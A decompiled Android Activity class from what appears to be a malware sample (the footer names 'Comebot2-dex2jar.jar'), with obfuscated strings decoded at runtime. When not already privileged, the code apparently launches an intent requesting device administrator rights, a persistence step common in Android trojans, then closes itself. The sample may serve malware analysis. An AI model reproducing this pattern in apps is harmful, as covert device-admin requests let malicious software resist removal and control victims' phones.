package anu_bispro.app;

import android.app.Activity;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.os.Parcelable;

public class admky extends Activity {
  private c a;
  
  protected void onCreate(Bundle paramBundle) {
    super.onCreate(paramBundle);
    setContentView(2130903041);
    this.a = new c((Context)this);
    if (!this.a.b()) {
      Intent intent = new Intent(b.a("ZH_TTO_\bZVK\bZEOOTH\025gbdb~pre~yzbvou"));
      intent.putExtra(c.a("\007c\002\td\002#\007}\026#\003u\022\007#\"H0D%H9L\"@/C"), (Parcelable)this.a.a());
      intent.putExtra(b.a("ZH_TTO_\bZVK\b^^OTZ\bzby~~kjzhzrriu"), "");
      startActivityForResult(intent, 100);
      finish();
    } 
    finish();
  }
}


/* Location:              /home/fahim/Desktop/Comebot2-dex2jar.jar!/anu_bispro/app/admky.class
 * Java compiler version: 6 (50.0)
 * JD-Core Version:       1.1.3
 */